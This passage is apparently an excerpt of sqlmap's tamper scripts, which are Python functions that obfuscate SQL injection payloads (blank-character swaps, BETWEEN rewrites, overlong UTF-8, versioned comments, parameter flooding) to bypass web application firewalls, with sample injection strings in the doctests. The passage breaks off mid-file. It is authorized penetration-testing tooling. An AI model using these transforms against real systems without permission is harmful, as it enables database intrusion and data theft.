sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\nimport random\n\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.compat import xrange\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MSSQL))\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MsSQL) instances of space character (' ') with a random blank character from a valid set of alternate characters\n\n    Requirement:\n        * Microsoft SQL Server\n\n    Tested against:\n        * Microsoft SQL Server 2000\n        * Microsoft SQL Server 2005\n\n    Notes:\n        * Useful to bypass several web application firewalls\n\n    >>> random.seed(0)\n    >>> tamper('SELECT id FROM users')\n    'SELECT%0Did%0DFROM%04users'\n    \"\"\"\n\n    # ASCII table:\n    #   SOH     01      start of heading\n    #   STX     02      start of text\n    #   ETX     03      end of text\n    #   EOT     04      end of transmission\n    #   ENQ     05      enquiry\n    #   ACK     06      acknowledge\n    #   BEL     07      bell\n    #   BS      08      backspace\n    #   TAB     09      horizontal tab\n    #   LF      0A      new line\n    #   VT      0B      vertical TAB\n    #   FF      0C      new page\n    #   CR      0D      carriage return\n    #   SO      0E      shift out\n    #   SI      0F      shift in\n    blanks = ('%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0B', '%0C', '%0D', '%0E', '%0F', '%0A')\n    retVal = payload\n\n    if payload:\n        retVal = \"\"\n        quote, doublequote, firstspace, end = False, False, False, False\n\n        for i in xrange(len(payload)):\n            if not firstspace:\n                if payload[i].isspace():\n                    firstspace = True\n                    retVal += random.choice(blanks)\n                    continue\n\n            elif payload[i] == '\\'':\n                quote = not quote\n\n            elif payload[i] == '\"':\n                doublequote = not doublequote\n\n            elif payload[i] == '#' or payload[i:i + 3] == '-- ':\n                end = True\n\n            elif payload[i] == \" \" and not doublequote and not quote:\n                if end:\n                    retVal += random.choice(blanks[:-1])\n                else:\n                    retVal += random.choice(blanks)\n\n                continue\n\n            retVal += payload[i]\n\n    return retVal\n", "tamper/ord2ascii.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.HIGHEST\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces ORD() occurences with equivalent ASCII() calls \n\n    Requirement:\n        * MySQL\n\n    >>> tamper(\"ORD('42')\")\n    \"ASCII('42')\"\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        retVal = re.sub(r\"(?i)\\bORD\\(\", \"ASCII(\", payload)\n\n    return retVal\n", "tamper/between.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.HIGHEST\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' and equals operator ('=') with 'BETWEEN # AND #'\n\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0\n\n    Notes:\n        * Useful to bypass weak and bespoke web application firewalls that\n          filter the greater than character\n        * The BETWEEN clause is SQL standard. Hence, this tamper script\n          should work against all (?) databases\n\n    >>> tamper('1 AND A > B--')\n    '1 AND A NOT BETWEEN 0 AND B--'\n    >>> tamper('1 AND A = B--')\n    '1 AND A BETWEEN B AND B--'\n    >>> tamper('1 AND LAST_INSERT_ROWID()=LAST_INSERT_ROWID()')\n    '1 AND LAST_INSERT_ROWID() BETWEEN LAST_INSERT_ROWID() AND LAST_INSERT_ROWID()'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        match = re.search(r\"(?i)(\\b(AND|OR)\\b\\s+)(?!.*\\b(AND|OR)\\b)([^>]+?)\\s*>\\s*([^>]+)\\s*\\Z\", payload)\n\n        if match:\n            _ = \"%s %s NOT BETWEEN 0 AND %s\" % (match.group(2), match.group(4), match.group(5))\n            retVal = retVal.replace(match.group(0), _)\n        else:\n            retVal = re.sub(r\"\\s*>\\s*(\\d+|'[^']+'|\\w+\\(\\d+\\))\", r\" NOT BETWEEN 0 AND \\g<1>\", payload)\n\n        if retVal == payload:\n            match = re.search(r\"(?i)(\\b(AND|OR)\\b\\s+)(?!.*\\b(AND|OR)\\b)([^=]+?)\\s*=\\s*([\\w()]+)\\s*\", payload)\n\n            if match:\n                _ = \"%s %s BETWEEN %s AND %s\" % (match.group(2), match.group(4), match.group(5), match.group(5))\n                retVal = retVal.replace(match.group(0), _)\n\n    return retVal\n", "tamper/dunion.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\nimport re\n\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.HIGHEST\n\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.ORACLE))\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces instances of <int> UNION with <int>DUNION\n\n    Requirement:\n        * Oracle\n\n    Notes:\n        * Reference: https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf\n\n    >>> tamper('1 UNION ALL SELECT')\n    '1DUNION ALL SELECT'\n    \"\"\"\n\n    return re.sub(r\"(?i)(\\d+)\\s+(UNION )\", r\"\\g<1>D\\g<2>\", payload) if payload else payload\n", "tamper/informationschemacomment.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.NORMAL\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Add an inline comment (/**/) to the end of all occurrences of (MySQL) \"information_schema\" identifier\n\n    >>> tamper('SELECT table_name FROM INFORMATION_SCHEMA.TABLES')\n    'SELECT table_name FROM INFORMATION_SCHEMA/**/.TABLES'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        retVal = re.sub(r\"(?i)(information_schema)\\.\", r\"\\g<1>/**/.\", payload)\n\n    return retVal\n", "tamper/substring2leftright.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.NORMAL\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces PostgreSQL SUBSTRING with LEFT and RIGHT\n\n    Tested against:\n        * PostgreSQL 9.6.12\n\n    Note:\n        * Useful to bypass weak web application firewalls that filter SUBSTRING (but not LEFT and RIGHT)\n\n    >>> tamper('SUBSTRING((SELECT usename FROM pg_user)::text FROM 1 FOR 1)')\n    'LEFT((SELECT usename FROM pg_user)::text,1)'\n    >>> tamper('SUBSTRING((SELECT usename FROM pg_user)::text FROM 3 FOR 1)')\n    'LEFT(RIGHT((SELECT usename FROM pg_user)::text,-2),1)'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        match = re.search(r\"SUBSTRING\\((.+?)\\s+FROM[^)]+(\\d+)[^)]+FOR[^)]+1\\)\", payload)\n\n        if match:\n            pos = int(match.group(2))\n            if pos == 1:\n                _ = \"LEFT(%s,1)\" % (match.group(1))\n            else:\n                _ = \"LEFT(RIGHT(%s,%d),1)\" % (match.group(1), 1 - pos)\n\n            retVal = retVal.replace(match.group(0), _)\n\n    return retVal\n", "tamper/binary.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.HIGHEST\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Injects keyword binary where possible\n\n    Requirement:\n        * MySQL\n\n    >>> tamper('1 UNION ALL SELECT NULL, NULL, NULL')\n    '1 UNION ALL SELECT binary NULL, binary NULL, binary NULL'\n    >>> tamper('1 AND 2>1')\n    '1 AND binary 2>binary 1'\n    >>> tamper('CASE WHEN (1=1) THEN 1 ELSE 0x28 END')\n    'CASE WHEN (binary 1=binary 1) THEN binary 1 ELSE binary 0x28 END'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        retVal = re.sub(r\"\\bNULL\\b\", \"binary NULL\", retVal)\n        retVal = re.sub(r\"\\b(THEN\\s+)(\\d+|0x[0-9a-f]+)(\\s+ELSE\\s+)(\\d+|0x[0-9a-f]+)\", r\"\\g<1>binary \\g<2>\\g<3>binary \\g<4>\", retVal)\n        retVal = re.sub(r\"(\\d+\\s*[>=]\\s*)(\\d+)\", r\"binary \\g<1>binary \\g<2>\", retVal)\n        retVal = re.sub(r\"\\b((AND|OR)\\s*)(\\d+)\", r\"\\g<1>binary \\g<3>\", retVal)\n        retVal = re.sub(r\"([>=]\\s*)(\\d+)\", r\"\\g<1>binary \\g<2>\", retVal)\n        retVal = re.sub(r\"\\b(0x[0-9a-f]+)\", r\"binary \\g<1>\", retVal)\n        retVal = re.sub(r\"(\\s+binary)+\", r\"\\g<1>\", retVal)\n\n    return retVal\n", "tamper/appendnullbyte.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\n\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOWEST\n\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.ACCESS))\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Appends (Access) NULL byte character (%00) at the end of payload\n\n    Requirement:\n        * Microsoft Access\n\n    Notes:\n        * Useful to bypass weak web application firewalls when the back-end\n          database management system is Microsoft Access - further uses are\n          also possible\n\n    Reference: http://projects.webappsec.org/w/page/13246949/Null-Byte-Injection\n\n    >>> tamper('1 AND 1=1')\n    '1 AND 1=1%00'\n    \"\"\"\n\n    return \"%s%%00\" % payload if payload else payload\n", "tamper/space2mysqlblank.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\nimport random\n\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.compat import xrange\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MySQL) instances of space character (' ') with a random blank character from a valid set of alternate characters\n\n    Requirement:\n        * MySQL\n\n    Tested against:\n        * MySQL 5.1\n\n    Notes:\n        * Useful to bypass several web application firewalls\n\n    >>> random.seed(0)\n    >>> tamper('SELECT id FROM users')\n    'SELECT%A0id%0CFROM%0Dusers'\n    \"\"\"\n\n    # ASCII table:\n    #   TAB     09      horizontal TAB\n    #   LF      0A      new line\n    #   FF      0C      new page\n    #   CR      0D      carriage return\n    #   VT      0B      vertical TAB        (MySQL and Microsoft SQL Server only)\n    #           A0      non-breaking space\n    blanks = ('%09', '%0A', '%0C', '%0D', '%0B', '%A0')\n    retVal = payload\n\n    if payload:\n        retVal = \"\"\n        quote, doublequote, firstspace = False, False, False\n\n        for i in xrange(len(payload)):\n            if not firstspace:\n                if payload[i].isspace():\n                    firstspace = True\n                    retVal += random.choice(blanks)\n                    continue\n\n            elif payload[i] == '\\'':\n                quote = not quote\n\n            elif payload[i] == '\"':\n                doublequote = not doublequote\n\n            elif payload[i] == \" \" and not doublequote and not quote:\n                retVal += random.choice(blanks)\n                continue\n\n            retVal += payload[i]\n\n    return retVal\n", "tamper/luanginx.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport random\nimport string\n\nfrom lib.core.compat import xrange\nfrom lib.core.enums import HINT\nfrom lib.core.enums import PRIORITY\nfrom lib.core.settings import DEFAULT_GET_POST_DELIMITER\n\n__priority__ = PRIORITY.NORMAL\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    LUA-Nginx WAFs Bypass (e.g. Cloudflare)\n\n    Reference:\n        * https://opendatasecurity.io/cloudflare-vulnerability-allows-waf-be-disabled/\n\n    Notes:\n        * Lua-Nginx WAFs do not support processing of more than 100 parameters\n\n    >>> random.seed(0); hints={}; payload = tamper(\"1 AND 2>1\", hints=hints); \"%s&%s\" % (hints[HINT.PREPEND], payload)\n    '34=&Xe=&90=&Ni=&rW=&lc=&te=&T4=&zO=&NY=&B4=&hM=&X2=&pU=&D8=&hm=&p0=&7y=&18=&RK=&Xi=&5M=&vM=&hO=&bg=&5c=&b8=&dE=&7I=&5I=&90=&R2=&BK=&bY=&p4=&lu=&po=&Vq=&bY=&3c=&ps=&Xu=&lK=&3Q=&7s=&pq=&1E=&rM=&FG=&vG=&Xy=&tQ=&lm=&rO=&pO=&rO=&1M=&vy=&La=&xW=&f8=&du=&94=&vE=&9q=&bE=&lQ=&JS=&NQ=&fE=&RO=&FI=&zm=&5A=&lE=&DK=&x8=&RQ=&Xw=&LY=&5S=&zi=&Js=&la=&3I=&r8=&re=&Xe=&5A=&3w=&vs=&zQ=&1Q=&HW=&Bw=&Xk=&LU=&Lk=&1E=&Nw=&pm=&ns=&zO=&xq=&7k=&v4=&F6=&Pi=&vo=&zY=&vk=&3w=&tU=&nW=&TG=&NM=&9U=&p4=&9A=&T8=&Xu=&xa=&Jk=&nq=&La=&lo=&zW=&xS=&v0=&Z4=&vi=&Pu=&jK=&DE=&72=&fU=&DW=&1g=&RU=&Hi=&li=&R8=&dC=&nI=&9A=&tq=&1w=&7u=&rg=&pa=&7c=&zk=&rO=&xy=&ZA=&1K=&ha=&tE=&RC=&3m=&r2=&Vc=&B6=&9A=&Pk=&Pi=&zy=&lI=&pu=&re=&vS=&zk=&RE=&xS=&Fs=&x8=&Fe=&rk=&Fi=&Tm=&fA=&Zu=&DS=&No=&lm=&lu=&li=&jC=&Do=&Tw=&xo=&zQ=&nO=&ng=&nC=&PS=&fU=&Lc=&Za=&Ta=&1y=&lw=&pA=&ZW=&nw=&pM=&pa=&Rk=&lE=&5c=&T4=&Vs=&7W=&Jm=&xG=&nC=&Js=&xM=&Rg=&zC=&Dq=&VA=&Vy=&9o=&7o=&Fk=&Ta=&Fq=&9y=&vq=&rW=&X4=&1W=&hI=&nA=&hs=&He=&No=&vy=&9C=&ZU=&t6=&1U=&1Q=&Do=&bk=&7G=&nA=&VE=&F0=&BO=&l2=&BO=&7o=&zq=&B4=&fA=&lI=&Xy=&Ji=&lk=&7M=&JG=&Be=&ts=&36=&tW=&fG=&T4=&vM=&hG=&tO=&VO=&9m=&Rm=&LA=&5K=&FY=&HW=&7Q=&t0=&3I=&Du=&Xc=&BS=&N0=&x4=&fq=&jI=&Ze=&TQ=&5i=&T2=&FQ=&VI=&Te=&Hq=&fw=&LI=&Xq=&LC=&B0=&h6=&TY=&HG=&Hw=&dK=&ru=&3k=&JQ=&5g=&9s=&HQ=&vY=&1S=&ta=&bq=&1u=&9i=&DM=&DA=&TG=&vQ=&Nu=&RK=&da=&56=&nm=&vE=&Fg=&jY=&t0=&DG=&9o=&PE=&da=&D4=&VE=&po=&nm=&lW=&X0=&BY=&NK=&pY=&5Q=&jw=&r0=&FM=&lU=&da=&ls=&Lg=&D8=&B8=&FW=&3M=&zy=&ho=&Dc=&HW=&7E=&bM=&Re=&jk=&Xe=&JC=&vs=&Ny=&D4=&fA=&DM=&1o=&9w=&3C=&Rw=&Vc=&Ro=&PK=&rw=&Re=&54=&xK=&VK=&1O=&1U=&vg=&Ls=&xq=&NA=&zU=&di=&BS=&pK=&bW=&Vq=&BC=&l6=&34=&PE=&JG=&TA=&NU=&hi=&T0=&Rs=&fw=&FQ=&NQ=&Dq=&Dm=&1w=&PC=&j2=&r6=&re=&t2=&Ry=&h2=&9m=&nw=&X4=&vI=&rY=&1K=&7m=&7g=&J8=&Pm=&RO=&7A=&fO=&1w=&1g=&7U=&7Y=&hQ=&FC=&vu=&Lw=&5I=&t0=&Na=&vk=&Te=&5S=&ZM=&Xs=&Vg=&tE=&J2=&Ts=&Dm=&Ry=&FC=&7i=&h8=&3y=&zk=&5G=&NC=&Pq=&ds=&zK=&d8=&zU=&1a=&d8=&Js=&nk=&TQ=&tC=&n8=&Hc=&Ru=&H0=&Bo=&XE=&Jm=&xK=&r2=&Fu=&FO=&NO=&7g=&PC=&Bq=&3O=&FQ=&1o=&5G=&zS=&Ps=&j0=&b0=&RM=&DQ=&RQ=&zY=&nk=&1 AND 2>1'\n    \"\"\"\n\n    hints = kwargs.get(\"hints\", {})\n    delimiter = kwargs.get(\"delimiter\", DEFAULT_GET_POST_DELIMITER)\n\n    hints[HINT.PREPEND] = delimiter.join(\"%s=\" % \"\".join(random.sample(string.ascii_letters + string.digits, 2)) for _ in xrange(500))\n\n    return payload\n", "tamper/uppercase.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.data import kb\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.NORMAL\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces each keyword character with upper case value (e.g. select -> SELECT)\n\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0\n\n    Notes:\n        * Useful to bypass very weak and bespoke web application firewalls\n          that has poorly written permissive regular expressions\n        * This tamper script should work against all (?) databases\n\n    >>> tamper('insert')\n    'INSERT'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        for match in re.finditer(r\"[A-Za-z_]+\", retVal):\n            word = match.group()\n\n            if word.upper() in kb.keywords:\n                retVal = retVal.replace(word, word.upper())\n\n    return retVal\n", "tamper/versionedmorekeywords.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\nimport re\n\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.data import kb\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import PRIORITY\nfrom lib.core.settings import IGNORE_SPACE_AFFECTED_KEYWORDS\n\n__priority__ = PRIORITY.HIGHER\n\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s >= 5.1.13\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Encloses each keyword with (MySQL) versioned comment\n\n    Requirement:\n        * MySQL >= 5.1.13\n\n    Tested against:\n        * MySQL 5.1.56, 5.5.11\n\n    Notes:\n        * Useful to bypass several web application firewalls when the\n          back-end database management system is MySQL\n\n    >>> tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#')\n    '1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#'\n    \"\"\"\n\n    def process(match):\n        word = match.group('word')\n        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:\n            return match.group().replace(word, \"/*!%s*/\" % word)\n        else:\n            return match.group()\n\n    retVal = payload\n\n    if payload:\n        retVal = re.sub(r\"(?<=\\W)(?P<word>[A-Za-z_]+)(?=\\W|\\Z)\", process, retVal)\n        retVal = retVal.replace(\" /*!\", \"/*!\").replace(\"*/ \", \"*/\")\n\n    return retVal\n", "tamper/overlongutf8.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport string\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOWEST\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Converts all (non-alphanum) characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. ' -> %C0%A7)\n\n    Reference:\n        * https://www.acunetix.com/vulnerabilities/unicode-transformation-issues/\n        * https://www.thecodingforums.com/threads/newbie-question-about-character-encoding-what-does-0xc0-0x8a-have-in-common-with-0xe0-0x80-0x8a.170201/\n\n    >>> tamper('SELECT FIELD FROM TABLE WHERE 2>1')\n    'SELECT%C0%A0FIELD%C0%A0FROM%C0%A0TABLE%C0%A0WHERE%C0%A02%C0%BE1'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        retVal = \"\"\n        i = 0\n\n        while i < len(payload):\n            if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:\n                retVal += payload[i:i + 3]\n                i += 3\n            else:\n                if payload[i] not in (string.ascii_letters + string.digits):\n                    retVal += \"%%%.2X%%%.2X\" % (0xc0 + (ord(payload[i]) >> 6), 0x80 + (ord(payload[i]) & 0x3f))\n                else:\n                    retVal += payload[i]\n                i += 1\n\n    return retVal\n", "tamper/overlongutf8more.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport string\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOWEST\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94)\n\n    Reference:\n        * https://www.acunetix.com/vulnerabilities/unicode-transformation-issues/\n        * https://www.thecodingforums.com/threads/newbie-question-about-character-encoding-what-does-0xc0-0x8a-have-in-common-with-0xe0-0x80-0x8a.170201/\n\n    >>> tamper('SELECT FIELD FROM TABLE WHERE 2>1')\n    '%C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94%C0%A0%C1%86%C1%89%C1%85%C1%8C%C1%84%C0%A0%C1%86%C1%92%C1%8F%C1%8D%C0%A0%C1%94%C1%81%C1%82%C1%8C%C1%85%C0%A0%C1%97%C1%88%C1%85%C1%92%C1%85%C0%A0%C0%B2%C0%BE%C0%B1'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        retVal = \"\"\n        i = 0\n\n        while i < len(payload):\n            if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:\n                retVal += payload[i:i + 3]\n                i += 3\n            else:\n                retVal += \"%%%.2X%%%.2X\" % (0xc0 + (ord(payload[i]) >> 6), 0x80 + (ord(payload[i]) & 0x3f))\n                i += 1\n\n    return retVal\n", "tamper/hex2char.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\nimport re\n\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.convert import decodeHex\nfrom lib.core.convert import getOrds\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.NORMAL\n\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces each (MySQL) 0x<hex> encoded string with equivalent CONCAT(CHAR(),...) counterpart\n\n    Requirement:\n        * MySQL\n\n    Tested against:\n        * MySQL 4, 5.0 and 5.5\n\n    Notes:\n        * Useful in cases when web application does the upper casing\n\n    >>> tamper('SELECT 0xdeadbeef')\n    'SELECT CONCAT(CHAR(222),CHAR(173),CHAR(190),CHAR(239))'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        for match in re.finditer(r\"\\b0x([0-9a-f]+)\\b\", retVal):\n            if len(match.group(1)) > 2:\n                result = \"CONCAT(%s)\" % ','.join(\"CHAR(%d)\" % _ for _ in getOrds(decodeHex(match.group(1))))\n            else:\n                result = \"CHAR(%d)\" % ord(decodeHex(match.group(1)))\n            retVal = retVal.replace(match.group(0), result)\n\n    return retVal\n", "tamper/misunion.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\nimport re\n\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.HIGHEST\n\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces instances of UNION with -.1UNION\n\n    Requirement:\n        * MySQL\n\n    Notes:\n        * Reference: https://raw.githubusercontent.com/y0unge/Notes/master/SQL%20Injection%20WAF%20Bypassing%20shortcut.pdf\n\n    >>> tamper('1 UNION ALL SELECT')\n    '1-.1UNION ALL SELECT'\n    >>> tamper('1\" UNION ALL SELECT')\n    '1\"-.1UNION ALL SELECT'\n    \"\"\"\n\n    return re.sub(r\"(?i)\\s+(UNION )\", r\"-.1\\g<1>\", payload) if payload else payload\n", "tamper/unionalltounion.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.HIGHEST\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces instances of UNION ALL SELECT with UNION SELECT counterpart\n\n    >>> tamper('-1 UNION ALL SELECT')\n    '-1 UNION SELECT'\n    \"\"\"\n\n    return payload.replace(\"UNION ALL SELECT\", \"UNION SELECT\") if payload else payload\n", "tamper/scientific.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.HIGHEST\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Abuses MySQL scientific notation\n\n    Requirement:\n        * MySQL\n\n    Notes:\n        * Reference: https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/\n\n    >>> tamper('1 AND ORD(MID((CURRENT_USER()),7,1))>1')\n    '1 AND ORD 1.e(MID((CURRENT_USER 1.e( 1.e) 1.e) 1.e,7 1.e,1 1.e) 1.e)>1'\n    \"\"\"\n\n    if payload:\n        payload = re.sub(r\"[),.*^/|&]\", r\" 1.e\\g<0>\", payload)\n        payload = re.sub(r\"(\\w+)\\(\", lambda match: \"%s 1.e(\" % match.group(1) if not re.search(r\"(?i)\\A(MID|CAST|FROM|COUNT)\\Z\", match.group(1)) else match.group(0), payload)     # NOTE: MID and CAST don't work for sure\n\n    return payload\n", "tamper/commalesslimit.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\nimport re\n\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.HIGH\n\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MySQL) instances like 'LIMIT M, N' with 'LIMIT N OFFSET M' counterpart\n\n    Requirement:\n        * MySQL\n\n    Tested against:\n        * MySQL 5.0 and 5.5\n\n    >>> tamper('LIMIT 2, 3')\n    'LIMIT 3 OFFSET 2'\n    \"\"\"\n\n    retVal = payload\n\n    match = 